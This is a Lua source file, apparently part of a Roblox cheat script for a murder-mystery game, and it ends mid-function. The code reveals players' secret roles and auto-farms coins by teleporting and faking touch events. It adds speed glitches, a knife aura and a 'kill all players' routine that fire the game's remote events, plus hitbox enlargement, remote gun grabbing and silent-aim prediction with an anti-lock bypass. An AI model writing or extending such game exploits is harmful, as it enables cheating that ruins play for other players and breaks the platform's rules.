function DFunctions.FindGunDrop()
    local Map = DFunctions.GetMap()
    if Map then 
        return Map:FindFirstChild("GunDrop") 
    end
end

function DFunctions.IsAlive(Player, roles)
    local role = Roles.Players and Roles.Players[Player.Name]
    
    if not role then
        return true
    end

    return not role.Killed and not role.Dead
end

function DFunctions.UpdatePlayerData()
    if GetPlayerDataRemote then
        return GetPlayerDataRemote:InvokeServer()
    end
end

spawn(function()
    while task.wait(0.1) do
        local success, err = pcall(function()
            if GetPlayerDataRemote then
                Roles.Players = DFunctions.UpdatePlayerData()
            end

            for i, v in pairs(Roles.Players or {}) do
                if v.Role == "Murderer" then
                    Roles.Murderer = i
                elseif v.Role == "Sheriff" then
                    Roles.Sheriff = i
                elseif v.Role == "Hero" then
                    Roles.Hero = i
                end
            end
        end)
    end
end)

PlayerDataChanged.OnClientEvent:Connect(function(data)
    Roles.Players = data

    for i, v in pairs(Roles.Players or {}) do
        if v.Role == "Murderer" then
            Roles.Murderer = i
        elseif v.Role == "Sheriff" then
            Roles.Sheriff = i
        elseif v.Role == "Hero" then
            Roles.Hero = i
        end
    end
end)

function DFunctions.EquipTool(Name)
    for _, v in next, LocalPlayer.Backpack:GetChildren() do
        if v.Name == Name then
            local Equip = LocalPlayer.Backpack:FindFirstChild(Name)
            Equip.Parent = LocalPlayer.Character
        end
    end
end

function DFunctions.GetMurderer()
    for _, v in ipairs(Players:GetPlayers()) do 
        local Backpack = v:FindFirstChild("Backpack")
        local Character = v.Character
        if (Backpack and Backpack:FindFirstChild("Knife")) or (Character and Character:FindFirstChild("Knife")) then
            return v.Name
        end
    end   
    return nil 
end

function DFunctions.GetSheriff()
    for _, v in ipairs(Players:GetPlayers()) do 
        local Backpack = v:FindFirstChild("Backpack")
        local Character = v.Character
        if (Backpack and Backpack:FindFirstChild("Gun")) or (Character and Character:FindFirstChild("Gun")) then
            return v.Name
        end
    end   
    return nil 
end

function DFunctions.GetOtherPlayers()
    local players = {}
    local allPlayers = Players:GetPlayers()

    for i = 1, #allPlayers do
        local player = allPlayers[i]
        if player ~= LocalPlayer then
           wait(0.2)
            table.insert(players, player.Name)
        end
    end

    return players
end

local function ScreenMessage(text, color, yPos)
    local gui = Instance.new("ScreenGui")
    gui.Name = "RoleNotify"
    gui.Parent = game.Players.LocalPlayer.PlayerGui
    gui.IgnoreGuiInset = true

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0.2, 0)
    label.Position = UDim2.new(0, 0, yPos or 0.5, 0)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = color
    label.TextSize = 40
    label.Font = Enum.Font.GothamBold
    label.TextStrokeTransparency = 0
    label.Parent = gui

    task.delay(5, function()
        for i = 0, 1, 0.1 do
            label.TextTransparency = i
            label.TextStrokeTransparency = i
            task.wait(0.05)
        end
        gui:Destroy()
    end)
end

function DFunctions.NotifyRoles()
    if DConfiguration.Indicators.Roles.IsStarted then return end
    if not game.Players.LocalPlayer.PlayerGui.MainGUI.Game.RoleSelector.Visible then return end

    local GetRoles = Roles.Players
    local Murder, MurderPerk
    local SelfRole = "Innocent"

    for PlayerName, Data in pairs(GetRoles) do
        if Data.Role == "Murderer" then
            Murder, MurderPerk = PlayerName, Data.Perk
        end
        if PlayerName == game.Players.LocalPlayer.Name then
            SelfRole = Data.Role or "Innocent"
        end
    end

    local selfColor = Color3.fromRGB(0, 255, 0)
    if SelfRole == "Murderer" then selfColor = Color3.fromRGB(255, 0, 0)
    elseif SelfRole == "Sheriff" then selfColor = Color3.fromRGB(0, 0, 255) end
    
    ScreenMessage("YOU ARE: " .. SelfRole:upper(), selfColor, 0)

    task.wait(0)

    if Murder then
        if MurderPerk then 
            ScreenMessage("(Perk: " .. tostring(MurderPerk) .. ")", Color3.fromRGB(255, 255, 255), 0.8)
        end
        ScreenMessage("MURDERER: " .. Murder, Color3.fromRGB(255, 0, 0), 0.7)
    end

    DConfiguration.Indicators.Roles.IsStarted = true
    task.wait(0)
    DConfiguration.Indicators.Roles.IsStarted = false
end


local Gravity = workspace.Gravity

function DFunctions.getNearestCoins()
    local Map = DFunctions.GetMap()
    local CoinContainer = Map and (Map:FindFirstChild("CoinContainer") or Map:FindFirstChild("CoinsAreas"))
    if not CoinContainer or not LocalPlayer.Character then return end

    local closest, minDistance = nil, math.huge
    for _, coin in pairs(CoinContainer:GetChildren()) do
        if coin.Name == "Coin_Server" and coin:FindFirstChildWhichIsA("TouchTransmitter") and coin:FindFirstChild("CoinVisual") then
            local dist = (LocalPlayer.Character.HumanoidRootPart.Position - coin.Position).Magnitude
            if dist < minDistance then
                closest = coin
                minDistance = dist
            end
        end
    end

    return closest
end

function DFunctions.CoinsAura()
    local Map = DFunctions.GetMap()
    local CoinContainer = Map and (Map:FindFirstChild("CoinContainer") or Map:FindFirstChild("CoinsAreas"))
    if not CoinContainer or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end

    local closest, minDistance = nil, DConfiguration.AutoFarm.CoinsAuraDistance
    for _, coin in pairs(CoinContainer:GetChildren()) do
        if coin.Name == "Coin_Server" and coin:FindFirstChildWhichIsA("TouchTransmitter") and coin:FindFirstChild("CoinVisual") then
            local dist = (LocalPlayer.Character.HumanoidRootPart.Position - coin.Position).Magnitude
            if dist < minDistance then
                closest = coin
                minDistance = dist
            end
        end
    end

    if closest then
        firetouchinterest(LocalPlayer.Character.HumanoidRootPart, closest, 1)
        firetouchinterest(LocalPlayer.Character.HumanoidRootPart, closest, 0)
    end
end

function DFunctions.TweenAutoFarmCoins()
	if DConfiguration.AutoFarm.TeleportCoins then return end

	local character = LocalPlayer.Character
	if not character or not character.PrimaryPart then return end
	
	local now = tick()
	local FarmingStates = DConfiguration.AutoFarm.FarmingStates
	local AutoFarm = DConfiguration.AutoFarm
	
	if now - (FarmingStates.lastRescan or 0) >= 10 then
		DFunctions.FindFullLabel()
		FarmingStates.lastRescan = now
	end
	
	local IsFoundVisible = false
	for i = 1, #FullLabels do
		local label = FullLabels[i]
		if label and label.Visible and label:IsDescendantOf(LocalPlayer.PlayerGui) then
			IsFoundVisible = true
			break
		end
	end
	
	FarmingStates.isFullBag = IsFoundVisible

	local coin = DFunctions.getNearestCoins()
	local map = DFunctions.GetMap()

	if not coin or not map then
		FarmingStates.StartFarm = false
		FarmingStates.StopTween = true
		DFunctions.Tween({
			target = character.HumanoidRootPart,
			targetPart = character.HumanoidRootPart,
		})
		return
	end

	if AutoFarm.AutoReset and FarmingStates.isFullBag then
		local upper = character:FindFirstChild("UpperTorso")
		if upper then upper:Destroy() end
		FarmingStates.StopTween = true
	end

	if AutoFarm.AutoFarmXP and FarmingStates.isFullBag then
		local root = character.HumanoidRootPart
		root.CFrame = CFrame.new(root.Position.X, 10000, root.Position.Z)
	end

	if FarmingStates.isFullBag then
		FarmingStates.StartFarm = false
		FarmingStates.StopTween = true
		FarmingStates.isMax = true
		return
	end

	FarmingStates.StartFarm = true
	FarmingStates.StopTween = false

	local root = character.HumanoidRootPart
	local distance = (coin.Position - root.Position).Magnitude
	AutoFarm.TweenAddSpeed = (distance >= 250 and 20000) or 0

	root.AssemblyLinearVelocity = Vector3.zero
	if workspace.Gravity ~= 0 then workspace.Gravity = 0 end

	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if humanoid and not humanoid.PlatformStand then
		humanoid.PlatformStand = true
	end

	if FarmingStates.isMax then return end
	
	DFunctions.Tween({
		target = coin,
		targetPart = coin,
		newCFrame = CFrame.new(0, -3.8, 0) * CFrame.Angles(math.rad(90), 0, 0)
	})
end

function DFunctions.TPAutoFarmCoins()
	local AutoFarm = DConfiguration.AutoFarm
	local FarmingStates = AutoFarm.FarmingStates

	if AutoFarm.TweenCoins or tick() - (FarmingStates.LastTP or 0) < (FarmingStates.TPCooldown or 0) then return end

	local character = LocalPlayer.Character
	if not character or not character.PrimaryPart then return end
	
	local now = tick()
	if now - (FarmingStates.lastRescan or 0) >= 10 then
		DFunctions.FindFullLabel()
		FarmingStates.lastRescan = now
	end

	local IsFoundVisible = false
	for i = 1, #FullLabels do
		local label = FullLabels[i]
		if label and label.Visible and label:IsDescendantOf(LocalPlayer.PlayerGui) then
			IsFoundVisible = true
			break
		end
	end
	
	FarmingStates.isFullBag = IsFoundVisible
	
	local coin = DFunctions.getNearestCoins()
	local map = DFunctions.GetMap()

	if not coin or not map then
		FarmingStates.StartFarm = false
		FarmingStates.StopTween = true
		DFunctions.Tween({
			target = character.HumanoidRootPart,
			targetPart = character.HumanoidRootPart,
		})
		return
	end

	if AutoFarm.AutoReset and FarmingStates.isFullBag then
		local upper = character:FindFirstChild("UpperTorso")
		if upper then upper:Destroy() end
		FarmingStates.StopTween = true
	end

	if AutoFarm.AutoFarmXP and FarmingStates.isFullBag then
		local root = character.HumanoidRootPart
		root.CFrame = CFrame.new(root.Position.X, 10000, root.Position.Z)
	end

	if FarmingStates.isFullBag then
		FarmingStates.StartFarm = false
		FarmingStates.StopTween = true
		FarmingStates.isMax = true
		return
	end

	FarmingStates.StartFarm = true
	FarmingStates.StopTween = false
	FarmingStates.LastTP = now

	local root = character.HumanoidRootPart
	root.AssemblyLinearVelocity = Vector3.zero

	if workspace.Gravity ~= 0 then workspace.Gravity = 0 end

	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if humanoid and not humanoid.PlatformStand then
		humanoid.PlatformStand = true
	end

	if FarmingStates.isMax then return end
	
	root.CFrame = CFrame.new(coin.Position)
	task.wait(1)
	root.CFrame = CFrame.new(-95.1209, 10044.25, 51.0293)
end

function DFunctions.StopFarming()
    workspace.Gravity = Gravity
    DConfiguration.AutoFarm.FarmingStates.StopTween = true
    DConfiguration.AutoFarm.FarmingStates.StartFarm = false
    LocalPlayer.Character.Humanoid.PlatformStand = false
    LocalPlayer.Character.Humanoid.Sit = false
end

function DFunctions.isMovingAndJumping()
    local character = LocalPlayer.Character
    if not character or not character:FindFirstChild("Humanoid") then return false end
    local humanoid = character.Humanoid
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then return false end

    local isJumping = humanoid:GetState() == Enum.HumanoidStateType.Jumping or humanoid:GetState() == Enum.HumanoidStateType.Freefall
    local isMoving = rootPart.Velocity.Magnitude > 1 
    return isJumping and isMoving
end

function DFunctions.FakeSpeedGlitch()
    local character = LocalPlayer.Character
    if not character or not character:FindFirstChild("Humanoid") then return end
    
    local root = character.HumanoidRootPart
    local humanoid = character.Humanoid
    local velocityMag = root.Velocity.Magnitude

    if not (DConfiguration.Combat.Innocent.SpeedGlitch.FloatingButton or DConfiguration.Combat.Innocent.SpeedGlitch.Enabled or DConfiguration.Combat.Innocent.SpeedGlitch.Keybind) then
	    humanoid.WalkSpeed = DConfiguration.Misc.LocalPlayer.WalkSpeed.Value
	    local holder = DConfiguration.Combat.Innocent.SpeedGlitch.CurrentWeld
	
	    if holder then
            holder:Destroy()
            DConfiguration.Combat.Innocent.SpeedGlitch.CurrentWeld = nil
        end
        return
    end

    local Type = DConfiguration.Combat.Innocent.SpeedGlitch.Type

    if Type == "Walk Speed" then
        if DFunctions.isMovingAndJumping() then
            humanoid.WalkSpeed = DConfiguration.Combat.Innocent.SpeedGlitch.WalkSpeed + (velocityMag * 0.3)
        else
            humanoid.WalkSpeed = DConfiguration.Misc.LocalPlayer.WalkSpeed.Value
        end
    elseif Type == "Realistic" then
        local holder = DConfiguration.Combat.Innocent.SpeedGlitch.CurrentWeld
        local ws = DConfiguration.Combat.Innocent.SpeedGlitch.WalkSpeed
        if not holder or not holder.Parent or holder.Parent ~= character then
            if holder then
                holder:Destroy()
            end

            holder = Instance.new("Part")
            holder.Size = Vector3.new(2, 2, 2)
            holder.Anchored = false
            holder.CanCollide = false
            holder.Transparency = 1
            holder.CFrame = root.CFrame * CFrame.new(10 + (ws * 0.5), 10, -ws)
            holder.Name = "PhysicHolder"
            holder.Parent = character

            local ActualWeld = Instance.new("WeldConstraint")
            ActualWeld.Part0 = root
            ActualWeld.Part1 = holder
            ActualWeld.Parent = root

            DConfiguration.Combat.Innocent.SpeedGlitch.CurrentWeld = holder
        end
    end
end

function DFunctions.FakeBombClutch()
    if DConfiguration.Combat.Innocent.PrankBomb.InCooldown then
        return
    end
    
    DConfiguration.Combat.Innocent.PrankBomb.InCooldown = true
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    if not backpack or not char or not humanoid or not root then
        DConfiguration.Combat.Innocent.PrankBomb.InCooldown = false
        return
    end
    
    local bomb = backpack:FindFirstChild("FakeBomb") or char:FindFirstChild("FakeBomb")
    if not bomb then
        Remotes.Extras.ReplicateToy:InvokeServer("FakeBomb")
        bomb = backpack:WaitForChild("FakeBomb") or char:WaitForChild("FakeBomb")
    end
    bomb.Parent = char
    
    if bomb:IsDescendantOf(char) then
        bomb.Remote:FireServer(root.CFrame * CFrame.new(0, -3, 0), 50)
        task.wait(0.05)
        
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        local oldJump = DConfiguration.Misc.LocalPlayer.JumpPower.Value
        humanoid.JumpPower = 53
        task.wait(0.3)
        
        bomb.Parent = backpack
        humanoid.JumpPower = oldJump
    end
end

function DFunctions.JumpBoost(Height)
	local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    
    if not char or not hrp then return end
    
    hrp.Velocity = Vector3.new(hrp.Velocity.X, Height, hrp.Velocity.Z)
end

function DFunctions.KnifeAura()
  for i,v in pairs(Players:GetPlayers()) do
      if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer:DistanceFromCharacter(v.Character.HumanoidRootPart.Position) < DConfiguration.Combat.Murderer.KnifeAura.Radius then
          local Character = LocalPlayer.Character 
          if not Character then return end
          
          local Knife = Character and Character:FindFirstChild("Knife")
          DFunctions.EquipTool("Knife") 
          
          local TargetCharacter = v.Character
          if not TargetCharacter then return end
          
          local Root = TargetCharacter and TargetCharacter:FindFirstChild("HumanoidRootPart")
          
         if not Knife then return end
          Knife.Events.KnifeStabbed:FireServer()
          Knife.Events.HandleTouched:FireServer(Root)
        end
    end
end

function DFunctions.KillTarget(Name)
  for i,v in pairs(Players:GetPlayers()) do
      if v ~= LocalPlayer and v.Name == tostring(Name) and v.Character then
          local Character = LocalPlayer.Character 
          if not Character then return end
          
          local Knife = Character and Character:FindFirstChild("Knife")
          DFunctions.EquipTool("Knife") 
          
          local TargetCharacter = v.Character
          if not TargetCharacter then return end
          
          local Root = TargetCharacter and TargetCharacter:FindFirstChild("HumanoidRootPart")
          
          if not Knife then return end
          Knife.Events.KnifeStabbed:FireServer()
          Knife.Events.HandleTouched:FireServer(Root)
        end
    end
end

function DFunctions.KillAllPlayers()
  for i,v in pairs(Players:GetPlayers()) do
      if v ~= LocalPlayer and v.Character then
          local Character = LocalPlayer.Character 
          if not Character then return end
          
          local Knife = Character and Character:FindFirstChild("Knife")
          DFunctions.EquipTool("Knife") 
          
          local TargetCharacter = v.Character
          if not TargetCharacter then return end
          
          local Root = TargetCharacter and TargetCharacter:FindFirstChild("HumanoidRootPart")
          
          if not Knife then return end
          Knife.Events.KnifeStabbed:FireServer()
          Knife.Events.HandleTouched:FireServer(Root)
        end
    end
end

function DFunctions.SetHitbox(Size, Visible)
	for i,v in pairs(Players:GetPlayers()) do
	   if v ~= LocalPlayer and v.Character then
           local Character = v.Character
           local Root = Character and Character:FindFirstChild("HumanoidRootPart")
          
           if Root then
               if Visible then
                  Root.Transparency = 0.5
               else
                  Root.Transparency = 1
               end
               
               Root.Size = Vector3.new(Size, Size, Size)
           end
        end
    end
end

function DFunctions.GunDropAura()
	if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
	
	local Map = DFunctions.GetMap()
	if Map then
		local GunDrop = Map:FindFirstChild("GunDrop")
		if GunDrop and LocalPlayer:DistanceFromCharacter(GunDrop.Position) <= DConfiguration.Combat.Sheriff.GunDrop.Range then
			firetouchinterest(LocalPlayer.Character.HumanoidRootPart, GunDrop, 1) 
			firetouchinterest(LocalPlayer.Character.HumanoidRootPart, GunDrop, 0)
		end
	end
end

function DFunctions.GrabGun()
	if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
	
	local Map = DFunctions.GetMap()
	if Map then
		local GunDrop = Map:FindFirstChild("GunDrop")
		if GunDrop then
			firetouchinterest(LocalPlayer.Character.HumanoidRootPart, GunDrop, 1) 
			firetouchinterest(LocalPlayer.Character.HumanoidRootPart, GunDrop, 0)
		end
	end
end

local function TrimCache(tbl, maxSize)
	local count = 0

	for _ in pairs(tbl) do
		count += 1
	end

	if count > maxSize then
		for k in pairs(tbl) do
			tbl[k] = nil
		end
	end
end

local PredictionVariables = {
	Throw = {
		StabilizerCache = {},
		CurveHistory = {},
	},

	Gun = {
		StabilizerCache = {},
		CurveHistory = {},
		ResolverCache = {},
		LastSpeed = {},
		LastPosition = {},
		LastDirection = {},
		LagVelocityCache = {},
		LagTimeCache = {},
		DeltaTimeCache = {},
	}
}

spawn(function()
    while task.wait() do
        TrimCache(PredictionVariables.Gun.StabilizerCache, 8)
        TrimCache(PredictionVariables.Gun.CurveHistory, 8)
        TrimCache(PredictionVariables.Gun.ResolverCache, 7)
        TrimCache(PredictionVariables.Gun.LastDirection, 6)
        TrimCache(PredictionVariables.Gun.LastPosition, 6)
        TrimCache(PredictionVariables.Gun.LastSpeed, 5)
        TrimCache(PredictionVariables.Gun.LagVelocityCache, 5)
        TrimCache(PredictionVariables.Gun.LagTimeCache, 5)
        TrimCache(PredictionVariables.Gun.DeltaTimeCache, 10)
        
        TrimCache(PredictionVariables.Throw.StabilizerCache, 13)
        TrimCache(PredictionVariables.Throw.CurveHistory, 9)
    end
end)

local SimulatedVelocityStats = {
	lastPos = nil,
	lastTick = nil,
	lastTarget = nil,
	lastVelocity = Vector3.zero,
	running = false,
}

function DFunctions.GetSimulatedVelocity(Root)
    if not Root then
        return Vector3.zero
    end

    if Root ~= SimulatedVelocityStats.lastTarget or not SimulatedVelocityStats.lastPos then
        SimulatedVelocityStats.lastPos = Root.Position
        SimulatedVelocityStats.lastTick = Workspace:GetServerTimeNow()
        SimulatedVelocityStats.lastTarget = Root
        SimulatedVelocityStats.lastVelocity = Vector3.zero

        if not SimulatedVelocityStats.running then
            SimulatedVelocityStats.running = true
            task.spawn(function()
                while SimulatedVelocityStats.lastTarget and SimulatedVelocityStats.lastTarget.Parent do
                    local now = Workspace:GetServerTimeNow()
                    local dt = now - SimulatedVelocityStats.lastTick

                    dt = math.clamp(dt, 0.008, 0.1)

                    local pos = SimulatedVelocityStats.lastTarget.Position
                    local delta = pos - SimulatedVelocityStats.lastPos
                    local distance = delta.Magnitude

                    local maxReasonableSpeed = 120
                    local maxReasonableDistance = maxReasonableSpeed * dt * 2

                    if distance > maxReasonableDistance then
                        SimulatedVelocityStats.lastPos = pos
                        SimulatedVelocityStats.lastTick = now
                        
                        SimulatedVelocityStats.lastVelocity *= 0.6
                        
                        task.wait(0.015)
                        continue
                    end

                    local velocity = delta / dt

                    velocity = Vector3.new(velocity.X, math.clamp(velocity.Y, -35, 35), velocity.Z)
                    
                    local lastVel = SimulatedVelocityStats.lastVelocity
                    if lastVel.Magnitude > 0 and velocity.Magnitude > 0 then
                        local dot = velocity.Unit:Dot(lastVel.Unit)
                        if dot < -0.3 then
                            velocity = lastVel * 0.8
                        end
                    end

                    local horizontal = Vector3.new(velocity.X, 0, velocity.Z)
                    if horizontal.Magnitude > 120 then
                        horizontal = horizontal.Unit * 120
                    end
                    velocity = Vector3.new(horizontal.X, velocity.Y, horizontal.Z)

                    local deltaVel = velocity - SimulatedVelocityStats.lastVelocity
                    local maxChange = 80

                    if deltaVel.Magnitude > maxChange then
                        velocity = SimulatedVelocityStats.lastVelocity + deltaVel.Unit * maxChange
                    end

                    if velocity.Magnitude < 0.05 then
                        velocity = SimulatedVelocityStats.lastVelocity * 0.9
                    end

                    SimulatedVelocityStats.lastVelocity = SimulatedVelocityStats.lastVelocity:Lerp(velocity, 0.5)

                    SimulatedVelocityStats.lastPos = pos
                    SimulatedVelocityStats.lastTick = now

                    task.wait(0.015)
                end

                SimulatedVelocityStats.running = false
            end)
        end

        return Vector3.zero
    end

    return SimulatedVelocityStats.lastVelocity
end

function DFunctions.NotObstructing(TargetCharacter, ignoreList)
	if not TargetCharacter or not LocalPlayer.Character then return false end

	local originPart = LocalPlayer.Character:FindFirstChild("Head") or LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not originPart then return false end

	local origin = originPart.Position
	local partsToCheck = {
		TargetCharacter:FindFirstChild("Head"),
		TargetCharacter:FindFirstChild("UpperTorso") or TargetCharacter:FindFirstChild("Torso"),
		TargetCharacter:FindFirstChild("HumanoidRootPart")
	}

	local rayParams = RaycastParams.new()
	rayParams.FilterType = Enum.RaycastFilterType.Blacklist
	rayParams.FilterDescendantsInstances = ignoreList or {}
	rayParams.IgnoreWater = true

	for _, part in ipairs(partsToCheck) do
		if part then
			local direction = (part.Position - origin)
			local result = workspace:Raycast(origin, direction, rayParams)

			if result then
				if result.Instance and result.Instance:IsDescendantOf(TargetCharacter) then
					return true 
				end
			else
				return true
			end
		end
	end

	return false 
end

local circleCenter = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
local circle = Drawing.new("Circle")
circle.Visible = false
circle.Transparency = 0.8
circle.Thickness = 2
circle.Color = Color3.new(1, 0, 0)
circle.Filled = false
circle.Radius = DConfiguration.Combat.Settings.Circle.Radius
circle.Position = circleCenter

function InCircle(v)
    if DConfiguration.Combat.Settings.TargetCheckType == "Nearest" then
       return true
    end
    
    local hrp = v:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end

    local characterPosition = hrp.Position
    local screenPosition, onScreen = Camera:WorldToViewportPoint(characterPosition)
    
    if not onScreen then
        return false
    end
    
    local distance = (Vector2.new(screenPosition.X, screenPosition.Y) - circleCenter).Magnitude
    return distance <= DConfiguration.Combat.Settings.Circle.Radius
end

local touchPos = nil
UserInputService.TouchStarted:Connect(function(input, gameProcessed)
    if gameProcessed then return end 
    local x = input.Position.X
    local y = input.Position.Y + 45
    touchPos = Vector2.new(x, y)
end)

UserInputService.TouchMoved:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    local x = input.Position.X
    local y = input.Position.Y + 45
    touchPos = Vector2.new(x, y)
end)

UserInputService.TouchEnded:Connect(function(input)
    touchPos = nil
end)

function DFunctions.UpdateCirclePosition()
	local PositionType = DConfiguration.Combat.Settings.Circle.PositionType      
	local Crosshair = LocalPlayer.PlayerGui:WaitForChild("GameTopbar"):WaitForChild("Crosshair")
    if PositionType == "Center" then        
	    circle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)        
    elseif PositionType == "Mouse" then        
        local mouse = UserInputService:GetMouseLocation()
        circle.Position = Vector2.new(mouse.X, mouse.Y)        
    elseif PositionType == "Touch" then  
        if touchPos then
            circle.Position = Vector2.new(touchPos.X, touchPos.Y)
        end
    end        
    
    if Crosshair and Crosshair.Visible == true then
	    circle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)        
    end
          
    circleCenter = circle.Position      
end

local t = 0
RunService.RenderStepped:Connect(function(dt)  
    t += dt * 0.8  
    
    local Color1 = DConfiguration.Combat.Settings.Circle.Color1  
    local Color2 = DConfiguration.Combat.Settings.Circle.Color2  
    local alpha = (math.sin(t) + 1) * 0.5  
  
    DFunctions.UpdateCirclePosition()
    circle.Color = Color1:Lerp(Color2, alpha)  
end)  

-- Targets

function MurderTarget()
    local targets = {}

    for _, v in pairs(Players:GetPlayers()) do
        if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 and v.Character:FindFirstChild("HumanoidRootPart") then

            if not DConfiguration.Combat.SilentAim.Throwing.WallCheck or DFunctions.NotObstructing(v.Character) then
                table.insert(targets, v)
            end
        end
    end

    return targets
end

function SheriffTarget()
    local murderers = {}

    for _, player in ipairs(Players:GetPlayers()) do
        if (player.Backpack:FindFirstChild("Knife") or (player.Character and player.Character:FindFirstChild("Knife"))) and player.Character then

            local character = player.Character
            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

            if humanoidRootPart and (not DConfiguration.Combat.SilentAim.GunShot.WallCheck or DFunctions.NotObstructing(character)) then
                table.insert(murderers, player)
            end
        end
    end

    return murderers
end

function DFunctions.PredictKnife(Character)
    if not Character then return end

    local Type = DConfiguration.Combat.SilentAim.Throwing.Type
    local Settings = DConfiguration.Combat.Settings
    local Cache = PredictionVariables.Throw

    local Root = Character:FindFirstChild("HumanoidRootPart")
    local Head = Character:FindFirstChild("Head")
    if not Root or not Head then return end

    local Humanoid = Character:FindFirstChildOfClass("Humanoid")

    local RawVelocity = Root.AssemblyLinearVelocity or Vector3.zero
    local SimulatedVelocity = DFunctions.GetSimulatedVelocity(Root) or RawVelocity
    local VelocityDifference = (RawVelocity - SimulatedVelocity).Magnitude
    local Anti_Lock = Settings.AntiLockDetection and (VelocityDifference > 8 or RawVelocity.Magnitude < 0.2)
    local CurrentVelocity = Anti_Lock and SimulatedVelocity or RawVelocity
    local HorizontalVelocity = Vector3.new(CurrentVelocity.X, 0, CurrentVelocity.Z)
    local Speed = CurrentVelocity.Magnitude
    
    local LastSpeed = Cache.LastSpeed and Cache.LastSpeed[Character] or Speed

    local Delta = Speed - LastSpeed
    local MaxDelta = 80

    if Delta > MaxDelta then
        Speed = LastSpeed + MaxDelta
    elseif Delta < -MaxDelta then
        Speed = LastSpeed - MaxDelta
    end

    if Speed > 120 then
       Speed = 120
    end

    Cache.LastSpeed = Cache.LastSpeed or {}
    Cache.LastSpeed[Character] = Speed
    
    local HitRoll = math.random(1, 100)

    if Settings.HeadPrediction.Enabled and HitRoll <= Settings.HeadPrediction.HitChance then
        Root = Character:FindFirstChild("Head")
    else
        Root = Character:FindFirstChild("HumanoidRootPart")
    end

    local Distance = (LocalPlayer.Character.HumanoidRootPart.Position - Root.Position).Magnitude
    local TravelTime = math.clamp(Distance / 200, 0.3, 0.5)
   
    local Ping
    local PingFactor
    
    if Settings.PingBased.Type == "Server" then
        Ping = math.clamp(getgenv().CurrentServerPing or 80, 0, 500)
        PingFactor = math.clamp(Ping / 1000, 0.01, 0.5)
    elseif Settings.PingBased.Type == "Client" then
        Ping = math.clamp(getgenv().CurrentLocalPing or 80, 0, 500)
        PingFactor = math.clamp(Ping, 0.01, 0.5)
    elseif Settings.PingBased.Type == "Adaptive" then
        local ServerPing = math.clamp(getgenv().CurrentServerPing or 80, 0, 500)
        local ClientPing = math.clamp(getgenv().CurrentLocalPing or 80, 0, 500)

        Ping = (ServerPing * 0.5) + (ClientPing * 0.5)
        PingFactor = math.clamp(Ping / 1000, 0.01, 0.5)
    end
    
    if Ping > 350 then
        PingFactor *= 0.9
    end

    local PingSeconds = math.clamp((Settings.PingBased.Interval or 100) / 1000, 0.01, 0.5)

    local EffectiveTime = TravelTime
    if Settings.PingBased.Enabled then
        if Settings.PingBased.LatencyMode then
            EffectiveTime += PingFactor
        else
            EffectiveTime += PingSeconds
        end
    end
    
    local MovementType = "Idle"

    if HorizontalVelocity.Magnitude > 2 then
        if Humanoid then
            local MoveDir = Humanoid.MoveDirection
            if MoveDir.Magnitude > 0.1 then
                local Dot = MoveDir.Unit:Dot(HorizontalVelocity.Unit)
                if Dot > 0.6 then
                    MovementType = "Forward"
                elseif Dot < -0.4 then
                    MovementType = "Backward"
                else
                    MovementType = "Strafe"
                end
            end
        end
    end

    if MovementType == "Idle" then
        EffectiveTime *= 0.4
    elseif MovementType == "Strafe" then
       EffectiveTime *= 0.55
    elseif MovementType == "Backward" then
       EffectiveTime *= 0.7
    elseif MovementType == "Forward" then
       EffectiveTime *= 1.05
    end

    local FutureVelocity = HorizontalVelocity * EffectiveTime
    local FutureLookVector = Root.CFrame.LookVector * EffectiveTime

    local diff = LocalPlayer.Character.HumanoidRootPart.Position - Root.Position
    local flat = Vector3.new(diff.X, 0, diff.Z)
    local Direction = flat.Magnitude > 0 and flat.Unit or Vector3.zero
    local ForwardPush = Direction * Speed * EffectiveTime
    if ForwardPush.Magnitude > 60 then
       ForwardPush = ForwardPush.Unit * 60
    end

    local FuturePos = Root.Position

    if Type == "Traject" then
        FuturePos = Root.Position + FutureVelocity
    elseif Type == "Vectora" then
        FuturePos = Root.Position + FutureVelocity + FutureLookVector
    elseif Type == "Dartix" then
        FuturePos = Root.Position + ForwardPush + FutureVelocity + FutureLookVector
    end
    
    Cache.StabilizerCache[Character] = Cache.StabilizerCache[Character] or {}
    Cache.CurveHistory[Character] = Cache.CurveHistory[Character] or {}

    local StabilizerCache = Cache.StabilizerCache[Character]
    local CurveCache = Cache.CurveHistory[Character]

    local PreviousVelocity = StabilizerCache.LastVelocity or CurrentVelocity
    StabilizerCache.LastVelocity = CurrentVelocity

    local Acceleration = CurrentVelocity - PreviousVelocity
    local DampFactor = 0.6
    local StabilizedVelocity = PreviousVelocity + Acceleration * DampFactor

    FuturePos += StabilizedVelocity * 0.02

    local CurveOffset = Vector3.zero

    if CurveCache.LastVelocity then
        local Old = CurveCache.LastVelocity
        local New = CurrentVelocity
        if Old.Magnitude > 0 and New.Magnitude > 0 then
            if Old.Unit:Dot(New.Unit) < 0.9 then
                CurveOffset = Old:Cross(New) * 0.03
            end
        end
    end

    CurveCache.LastVelocity = CurrentVelocity
